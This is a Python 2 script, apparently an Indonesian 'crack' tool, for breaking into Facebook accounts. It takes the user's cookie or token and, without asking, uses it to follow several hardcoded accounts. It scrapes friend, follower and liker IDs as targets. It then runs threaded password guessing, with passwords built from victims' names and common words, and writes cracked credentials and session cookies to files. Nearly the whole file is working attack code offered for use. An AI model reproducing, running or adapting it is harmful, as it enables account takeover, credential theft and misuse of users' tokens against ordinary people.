#!/usr/bin/python2
# coding=utf-8
# code by Dapunta Khurayra X
# Facebook : Facebook.com/Dapunta.Khurayra.X

import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
import os,sys,uuid,time,datetime,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,bs4
from multiprocessing.pool import ThreadPool
from datetime import date

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')

try:
        import mechanize
except ImportError:
        os.system("pip2 install mechanize")
try:
        import requests
except ImportError:
        os.system("pip2 install requests bs4")
        os.system("python2 supreme.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

host="https://mbasic.facebook.com"
ua="Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

hm = [('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')]

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'}

if ("linux" in sys.platform.lower()):

        N = '\x1b[0m'
        G = '\x1b[32m'
        O = '\x1b[37m\x1b[33m'
        R = '\x1b[91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

logo = ("""              ______  _____  ___  ______  _______
             / __/ / / / _ \/ _ \/ __/  |/  / __/
            _\ \/ /_/ / ___/ , _/ _// /|_/ / _/
           /___/\____/_/  /_/|_/___/_/  /_/___/
            
               Coded By : Dapunta Khurayra X
─────────────────────────────────────────────────────────────""")

pw = False
back = 0
loop = 0
threads = []
ok = []
cp = []
id = []
Successful = []
Checkpoint = []
done = []
pw = []
target = []

def login():
    os.system('clear')
    print logo
    print ("   [ Choose Login Methode ]\n")
    print ("   [•] Login With Cookies")
    print ("   [•] Login With Token")
    print ("   [•] Update Script")
    choose_login()

def choose_login():
    log = raw_input("\n   [•] Choose : ")
    if log=="":
        print("   [!] Fill In The Correct")
        login()
    elif log=="1":
        log_cookies()
    elif log=="2":
        log_token()
    elif log=="3":
        update_script()
    else:
        print("   [!] Fill In The Correct")
        login()

def log_cookies():
    os.system('clear')
    print logo
    cookie = raw_input("\n   [•] Cookies : ")
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
        'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
        'referer'                   : 'https://m.facebook.com/',
        'host'                      : 'm.facebook.com',
        'origin'                    : 'https://m.facebook.com',
        'upgrade-insecure-requests' : '1',
        'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control'             : 'max-age=0',
        'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'content-type'              : 'text/html; charset=utf-8'
        }, cookies = {
        'cookie'                    : cookie
        })
        find_token = re.search('(EAAA\w+)', data.text)
        hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
            print "   [!] No Connection"
    cookie = open("login.txt", 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    jalan('\n   [•] Login Successful')
    bot_follow()

def log_token():
    os.system('clear')
    print logo
    toket = raw_input("\n   [•] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        jalan('\n   [•] Login Successful')
        bot_follow()
    except KeyError:
        print ("   [!] Token Invalid")
        os.system('clear')
        login()
        
def bot_follow():
    try:
		toket=open('login.txt','r').read()
    except IOError:
		print("   [!] Token Invalid")
        	os.system('rm -rf login.txt')
        	menu()
    requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
    requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
    requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
    requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
    requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
    requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket) #Angga Kurniawan
    options()
    
def options():
        os.system('clear')
        print logo
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print "\n   [!] Cookies/Token Invalid"
		os.system('rm -rf login.txt')
		os.system('clear')
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print "\n   [!] Cookies/Token Invalid"
		os.system('rm -rf login.txt')
		os.system('clear')
		login()
	except requests.exceptions.ConnectionError:
		print "\n   [!] No Connection"
		exit()
        os.system('clear')
        print logo
        print ("   [•] Welcome "+nama)
        print ("   [•] Your ID : "+id)
        print ("─────────────────────────────────────────────────────────────")
        print ("   [ Choose An Options ]\n")
        print ("   [1] Dump ID From Friend")
        print ("   [2] Dump ID From Public")
        print ("   [3] Dump ID Followers")
        print ("   [4] Dump ID Likers Post")
        print ("   [5] Start Crack")
        print ("   [6] Log Out")
        choose_options()

def choose_options():
    opt = raw_input("\n   [•] Choose : ")
    if opt=="":
        print("   [!] Fill In The Correct")
        options()
    elif opt=="1":
        dump_friend()
    elif opt=="2":
        dump_public()
    elif opt=="3":
        dump_followers()
    elif opt=="4":
        dump_likers()
    elif opt=="5":
        crack()
    elif opt=="6":
        update_script()
    else:
        print("   [!] Fill In The Correct")
        options()

def dump_friend():
        os.system('clear')
        print logo
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ih = raw_input("   [•] File Name : ")
        if ih in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".json","w")
        try:
            for i in s.get(api.format("me/friends?access_token=%s"%(toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] Total Dump : %s"%(len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("\n   [•] Success Dump ID From Friend")
            print("   [•] File Saved At : dump/%s.json "%(ih))
            raw_input("   [ Back ]")
            options()
        except OSError:
            exit("   [!] Dump Failed")

def dump_public():
        os.system('clear')
        print logo
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ah = raw_input("   [•] ID Public Target : ")
        ih = raw_input("   [•] File Name        : ")
        if ah in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".json","w")
        try:
            for i in  s.get(api.format("%s/friends?limit=10000&access_token=%s"%(ah,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] Mohon Tunggu Lagi Dump ID %s "%(len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("\n   [•] Success Dump ID From Public")
            print("   [•] File Saved At : dump/%s.json "%(ih))
            raw_input("   [ Back ]")
            options()
        except OSError:
            exit("   [!] Dump Failed")

def dump_followers():
        os.system('clear')
        print logo
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ih = raw_input("   [•] ID Followers Target : ")
        ah = raw_input("   [•] File Name           : ")
        if ih in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ah+".json","w")
        try:
            for i in  s.get(api.format("%s/subscribers?limit=10000&access_token=%s"%(ih,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] Mohon Tunggu Lagi Dump ID %s "%(len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("\n   [•] Success Dump ID From Followers")
            print("   [•] File Saved At : dump/%s.json "%(ah))
            raw_input("   [ Back ]")
            options()
        except OSError:
            exit("   [!] Dump Failed")

def dump_likers():
        os.system('clear')
        print logo
	global toket
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Cookie/Token Invalid")
		os.system('rm -rf login.txt')
		login()
        ah = raw_input("   [•] ID Post Target : ")
        ih = raw_input("   [•] File Name      : ")
        if ah in [""]:
        	exit("   [!] Don't Empty")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".json","w")
        try:
            for i in  s.get(api.format("%s/likes?limit=10000&access_token=%s"%(ah,toket)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r   [•] Mohon Tunggu Lagi Dump ID %s "%(len(id)
                    ));sys.stdout.flush()
            wrt.close()
            print("\n   [•] Success Dump ID From Likers Post")
            print("   [•] File Saved At : dump/%s.json "%(ih))
            raw_input("   [ Back ]")
            options()
        except OSError:
                exit("   [!] Dump Failed")

def crack():
    os.system('clear')
    print logo
    print("   [ Choose Methode Crack ]\n")
    print("   [1] Crack With Api")
    print("   [2] Crack With Mbasic")
    print("   [3] Crack With Touch Facebook")
    print("   [4] Crack With M.Facebook")
    print("   [5] Back")
    choose_crack()

def choose_crack():
    cra = raw_input("\n   [•] Choose : ")
    if cra=="":
        print("   [!] Fill In The Correct")
        crack()
    elif cra=="1":
        crack_mbasic()
    elif cra=="2":
        crack_mbasic()
    elif cra=="3":
        crack_mbasic()
    elif cra=="4":
        crack_mbasic()
    elif cra=="5":
        options()
    else:
        print("   [!] Fill In The Correct")
        crack()

def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
    
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
                                        results.append("123456")
	return results
    
class crack:
        os.system("clear")
        print logo
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print("   [•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("   [•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("   [•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print ("   [•] Example : sayang,bismillah,123456")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input("   [•] ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
                                print ("─────────────────────────────────────────────────────────────")
				print ("   [•] Crack Started...")
				print ("   [•] Account [OK] saved to : ok.txt")
				print ("   [•] Account [CP] saved to : cp.txt")
                                print ("─────────────────────────────────────────────────────────────")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\n   [•] Finished")
				break
	def pwlist(self):
		self.pw=raw_input("   [•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
                        print ("─────────────────────────────────────────────────────────────")
			print ("   [•] Crack Started...")
			print ("   [•] Account [OK] saved to : ok.txt")
			print ("   [•] Account [CP] saved to : cp.txt")
                        print ("─────────────────────────────────────────────────────────────")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			print("\n   [•] Finished")
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r   [OK] %s • %s       "%(fl.get("id"),i))
					self.ada.append("%s|%s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
					break
				elif log.get("status")=="cp":
					print("\r   [CP] %s • %s       "%(fl.get("id"),i))
					self.cp.append("%s|%s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s|%s|\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
            

    
if __name__=='__main__':
	try:
		token = open("login.txt").read() 
		options() 
	except IOError:
		print "   Token Invalid"
		time.sleep(1) 
		login()
	login()